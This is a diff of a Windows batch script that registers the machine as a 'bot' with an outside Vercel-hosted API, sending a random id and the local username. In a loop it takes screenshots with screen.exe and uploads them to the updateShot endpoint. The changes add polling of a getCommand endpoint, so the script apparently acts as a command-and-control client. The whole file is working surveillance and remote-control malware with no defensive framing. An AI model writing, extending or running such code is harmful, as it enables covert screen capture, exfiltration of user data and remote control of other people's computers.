@@ -1,12 +1,13 @@
-@echo off
-set second=0
-if not exist id.log (
+@REM @echo off
+set /A second=0
+if not exist id (
 
-set id=%random%%random%
+set id =%random%%random%
+echo %id% id
 curl -X POST https://test-api-t78m.vercel.app/addBot/%id%  -d name="%username%"
-echo %id%>id.log
+echo %id% > id
 echo echo command> command
-cmd /C .\screen.bat shot.png
+cmd /C .\screen.exe shot.png
 curl  https://test-api-t78m.vercel.app/updateShot/%id% -F testImage=@shot.png -F name="%username%"
 goto program
 
@@ -15,7 +16,7 @@ goto program
 )
 
 :loop
-set /p second= %second% +1
+set /A second= %second% + 1 
 ping localhost -n 3 > null
 goto program
 
@@ -23,13 +24,22 @@ goto program
 
 :program
 echo program %second%
+
+
 if %second% == 6 (
-    set second = 0
+    set /A second=0
     goto sendShot
 )
+set /p id=<id
+
+
+echo id = %id%
+curl  https://test-api-t78m.vercel.app/getCommand/%id%  > newCommand
+set /p command=<command
+set /p newCommand=<newCommand
 
 :sendShot
-set id=<.true
-cmd /C .\screen.bat shot.png
+set /p id=<id
+cmd /C .\screen.exe shot.png
 curl -F testImage=@shot.png -F name=kira https://test-api-t78m.vercel.app/updateShot/%id%
 goto program
